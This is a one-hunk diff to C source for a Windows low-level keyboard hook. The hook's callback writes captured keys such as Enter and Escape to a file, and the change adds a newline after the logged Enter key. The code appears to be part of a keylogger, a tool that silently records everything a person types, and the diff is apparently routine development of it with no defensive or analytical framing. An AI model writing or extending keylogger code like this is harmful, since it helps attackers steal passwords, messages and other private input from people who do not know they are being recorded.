@@ -70,7 +70,7 @@ LRESULT WINAPI LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         switch (map_key)
         {
         case VK_RETURN:
-            fprintf(file, "[ENTER]");
+            fprintf(file, "[ENTER] \n");
             return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam);
         case VK_ESCAPE:
             fprintf(file, " [ESCAPE] ");
